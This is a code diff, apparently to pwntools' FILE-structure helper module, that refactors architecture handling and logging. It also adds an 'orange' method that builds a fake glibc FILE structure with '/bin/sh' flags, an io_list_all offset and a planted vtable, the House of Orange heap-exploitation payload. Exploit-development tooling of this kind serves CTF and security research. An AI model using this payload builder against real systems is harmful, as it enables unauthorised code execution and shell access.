@@ -1,3 +1,18 @@
+from __future__ import absolute_import
+from __future__ import division
+
+from collections import namedtuple
+
+from pwnlib.abi import ABI
+from pwnlib.context import LocalContext
+from pwnlib.context import context
+from pwnlib.log import getLogger
+from pwnlib.util.packing import flat
+from pwnlib.util.packing import pack
+from pwnlib.util.packing import unpack_many
+
+log = getLogger(__name__)
+
 length=0
 size='size'
 name='name'
@@ -60,23 +75,20 @@ def update_var(l):
 def packit(s,l=8):
     if l==0:
         return ''
-    return  hex(s).replace('0x','').rjust(2*l,'0').replace('L','').decode('hex')[::-1].ljust(l,'\x00')
+    return hex(s).replace('0x','').rjust(2*l,'0').replace('L','').decode('hex')[::-1].ljust(l,'\x00')
 
 class FileStructure(dict):
     vars_=[]
     length={}
-    arch=64
+    arch='amd64'
 
-    def __init__(self,null=0,arch=64):
+    def __init__(self,null=0):
             self.vars_=[variables[i]['name'] for i in sorted(variables.keys())]
             self.update({v:0 for v in self.vars_})
             self.update(get_defaults(null))
             self['_offset']=0xffffffffffffffff
-            if arch==32 or arch==64:
-                self.arch=arch
-            else:
-                print " [-] Unknown architecture %i" % arch
-            if arch==32:
+            self.arch=context.arch
+            if self.arch=='i386':
                 self.length=update_var(4)
                 self['_old_offset']=0xffffffff
             else:
@@ -94,7 +106,7 @@ class FileStructure(dict):
 
     def __setitem__(self,item,value):
         if item not in self.vars_:
-            print " [-] Unknown variable %r" % item
+            log.error("Unknown variable %r" % item)
         return super(FileStructure,self).__setitem__(item,value)
 
     def __repr__(self):
@@ -108,7 +120,7 @@ class FileStructure(dict):
         structure=''
         for val in self.vars_:
             if type(self[val]) is str:
-                if self.arch==32:
+                if self.arch=='i386':
                     structure+=self[val].ljust(4,'\x00')
                 else:
                     structure+=self[val].ljust(8,'\x00')
@@ -130,7 +142,7 @@ class FileStructure(dict):
         structure=''
         for val in self.vars_:
             if type(self[val]) is str:
-                if self.arch==32:
+                if self.arch=='i386':
                     structure+=self[val].ljust(4,'\x00')
                 else:
                     structure+=self[val].ljust(8,'\x00')
@@ -158,8 +170,23 @@ class FileStructure(dict):
         self['fileno'] = 0
         return self.struntil('fileno')
 
+    def orange(self,io_list_all,vtable):
+        if self.arch=='amd64':
+            self['flags']='/bin/sh\x00'
+            self['_IO_read_ptr']=0x61
+            self['_IO_read_base']=io_list_all-0x10
+        else:
+            self['flags']='sh\x00'
+            self['_IO_read_ptr']=0x121
+            self['_IO_read_base']=io_list_all-0x8
+        self['_IO_write_base']=0
+        self['_IO_write_ptr']=1
+        self['vtable']=vtable
+        return self.__str__()
+
+
 if __name__=='__main__':
     from IPython import embed
-
+    context.arch='amd64'
     q=FileStructure(null=0x10203040)
     embed()
